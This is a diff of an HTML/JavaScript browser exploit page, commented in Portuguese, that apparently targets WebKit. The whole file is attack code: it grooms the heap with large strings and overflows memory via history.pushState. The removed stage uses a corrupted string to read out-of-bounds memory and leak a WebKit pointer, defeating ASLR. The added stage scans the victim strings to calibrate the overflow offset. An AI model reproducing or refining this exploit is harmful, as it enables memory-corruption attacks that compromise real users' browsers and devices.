@@ -1,98 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stage 3: ASLR Bypass (Leak Hunter)</title>
+    <title>Writer Finder (Onde está o 0x01?)</title>
     <style>
         body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
+        .hit { color: yellow; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1>Stage 3: The Leak Hunter</h1>
-    <p>1. Corromper String -> 2. Ler Memória -> 3. Achar Magic Value -> 4. Vazar Endereço WebKit</p>
+    <h1>Writer Finder</h1>
+    <p>Procurando onde os bytes 0x01 estão caindo dentro da string de 1MB.</p>
 
-    <button onclick="startLeakAttack(709520)">INICIAR CAÇADA DE PONTEIROS</button>
+    <button onclick="startFinder()">INICIAR BUSCA</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const OVERFLOW_AMT = 1024 * 64; 
+        const CURRENT_OFFSET = 709520; 
+        const OVERFLOW_AMT = 1024 * 128; // Aumentei para 128KB para garantir que suje tudo
+
         const TARGET_SIZE = 1024 * 1024; 
         const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
-        // O Número Mágico que vamos caçar na memória
-        const MAGIC_VALUE = 0x1337BEEF;
-
         var victims = [];
-        var magic_funcs = [];
-
-        // --- UTILITÁRIOS DE 64-BITS ---
-        function sread64(str, offset) {
-            // Lê 8 bytes da string e converte para Inteiro 64-bit
-            // Como é TextDecoder (8-bit), cada charCodeAt é 1 byte.
-            const low = (str.charCodeAt(offset) | (str.charCodeAt(offset+1)<<8) | (str.charCodeAt(offset+2)<<16) | (str.charCodeAt(offset+3)<<24)) >>> 0;
-            const high = (str.charCodeAt(offset+4) | (str.charCodeAt(offset+5)<<8) | (str.charCodeAt(offset+6)<<16) | (str.charCodeAt(offset+7)<<24)) >>> 0;
-            return { low, high, toString: () => "0x" + high.toString(16).padStart(8,'0') + low.toString(16).padStart(8,'0') };
-        }
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : '';
+            let cls = type === 'hit' ? 'class="hit"' : '';
             el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        // 1. CRIA O ALVO (CODEBLOCK)
-        function sprayCodeBlocks() {
-            log("Compilando funções com Magic Value (0x1337BEEF)...");
-            // Criamos muitas funções contendo o número mágico.
-            // O JIT/Interpretador vai colocar esse número na memória.
-            for(let i=0; i<200; i++) {
-                // Uma função que usa a constante
-                let f = new Function("x", "return x + 0x1337BEEF");
-                magic_funcs.push(f);
-                f(1); // Executa para garantir compilação/alocação
-            }
-        }
-
-        async function startLeakAttack(offset) {
-            // Passo 0: Preparar o terreno com os números mágicos
-            sprayCodeBlocks();
-
-            log(`Iniciando Exploit (Offset ${offset})...`);
+        async function startFinder() {
+            log(`Iniciando com Offset ${CURRENT_OFFSET}...`);
             
             victims = [];
             await forceGC();
 
             try {
-                // Passo 1: Spray de Strings (Vítimas do Overflow)
+                // 1. SPRAY "B"
                 let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                 rawBuffer.fill(0x42); 
                 let decoder = new TextDecoder("utf-8");
                 let baseString = decoder.decode(rawBuffer);
 
-                for(let i=0; i<80; i++) {
-                    let s = i + "_" + baseString.substring((i+"_").length);
+                const SPRAY_COUNT = 60; 
+                for(let i=0; i<SPRAY_COUNT; i++) {
+                    // Sem prefixo numérico para facilitar a busca, só "B"
+                    // Mas precisamos de algo para evitar deduplicação...
+                    // Vamos colocar o índice no FINAL
+                    let s = baseString.substring(0, PAYLOAD_SIZE - 10) + "_IDX_" + i;
                     victims.push(s);
                 }
 
-                // Passo 2: Buracos
-                for(let i=0; i<80; i+=2) victims[i] = null;
+                // 2. Buracos
+                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                 await forceGC();
 
-                // Passo 3: Overflow
-                log("Disparando Overflow...");
+                // 3. EXPLOIT
                 setTimeout(() => {
                     try {
-                        let buffer = "A".repeat(offset);
+                        let buffer = "A".repeat(CURRENT_OFFSET);
                         buffer += "\x01".repeat(OVERFLOW_AMT);
-                        history.pushState({}, "pwn", "/" + buffer);
+                        
+                        history.pushState({}, "finder", "/" + buffer);
 
-                        // Passo 4: Busca
-                        findTheLeak(PAYLOAD_SIZE);
+                        log("Escaneando strings por 0x01...");
+                        scanForBytes();
 
                     } catch (e) {
                         log("Erro: " + e.message);
@@ -104,60 +81,44 @@
             }
         }
 
-        function findTheLeak(originalLen) {
-            let corruptedStr = null;
-
-            // 4.1 Achar a string corrompida (A "Lanterna")
+        function scanForBytes() {
+            let foundAny = false;
             for(let i=1; i<victims.length; i+=2) {
                 let s = victims[i];
                 if(!s) continue;
+
                 try {
                     let err = new Error(s);
                     let msg = err.message;
-                    if (msg.length !== originalLen) {
-                        log(`!!! STRING CORROMPIDA ENCONTRADA (Index ${i}) !!!`, 'win');
-                        log(`Novo Tamanho: ${msg.length}`);
-                        corruptedStr = msg;
+
+                    // Procura o primeiro byte 0x01
+                    let firstIndex = -1;
+                    // Checagem rápida em blocos
+                    for(let k=0; k<1000; k++) {
+                        if (msg.charCodeAt(k) === 1) {
+                            firstIndex = k;
+                            break;
+                        }
+                    }
+
+                    if (firstIndex !== -1) {
+                        log(`!!! ENCONTRADO !!! String ${i} tem 0x01 no índice ${firstIndex}`, 'hit');
+                        log(`Isso significa que precisamos RECUAR ${firstIndex} bytes!`, 'hit');
+                        foundAny = true;
+                        alert("ALVO LOCALIZADO!");
                         break;
                     }
+                    
+                    // Se o tamanho mudou
+                    if (msg.length !== PAYLOAD_SIZE) {
+                        log(`!!! JACKPOT !!! Length mudou na String ${i}!`, 'hit');
+                        foundAny = true;
+                        break;
+                    }
+
                 } catch(e) {}
             }
-
-            if (!corruptedStr) {
-                log("Falha no Overflow. Reinicie e tente novamente.");
-                return;
-            }
-
-            // 4.2 Usar a Lanterna para caçar o Magic Value
-            log("Varrendo a memória vizinha em busca de 0x1337BEEF...");
-            
-            // Lemos de 8 em 8 bytes, começando DEPOIS do fim original da string
-            // Vamos varrer uns 2MB adiante
-            let startScan = originalLen;
-            let limitScan = originalLen + (1024 * 1024 * 2); 
-
-            for (let addr = startScan; addr < limitScan; addr += 8) {
-                // Lê 64 bits
-                let val = sread64(corruptedStr, addr);
-                
-                // Verifica se é o nosso Magic Value
-                // O valor pode estar no low dword ou high dword dependendo do alinhamento
-                if (val.low === MAGIC_VALUE || val.high === MAGIC_VALUE) {
-                    log(`!!! MAGIC VALUE ENCONTRADO EM +0x${(addr - originalLen).toString(16)} !!!`, 'win');
-                    
-                    // Se achamos o Magic Value, estamos dentro de um CodeBlock.
-                    // Os ponteiros do WebKit (vtable) geralmente estão próximos (ex: -16 ou -32 bytes).
-                    
-                    // Lê o valor vizinho (provável vtable do CodeBlock)
-                    let potentialVtable = sread64(corruptedStr, addr - 24); // Chute educado baseado em estrutura JSC
-                    log(`Candidato a Ponteiro WebKit: ${potentialVtable.toString()}`, 'win');
-                    
-                    alert("ASLR DEFEATED! LEAK CONFIRMED!");
-                    return;
-                }
-            }
-            
-            log("Magic value não encontrado na vizinhança imediata. (Pode estar mais longe).");
+            if(!foundAny) log("Nenhum 0x01 encontrado nos primeiros 1000 bytes das vítimas.");
         }
 
         async function forceGC() {
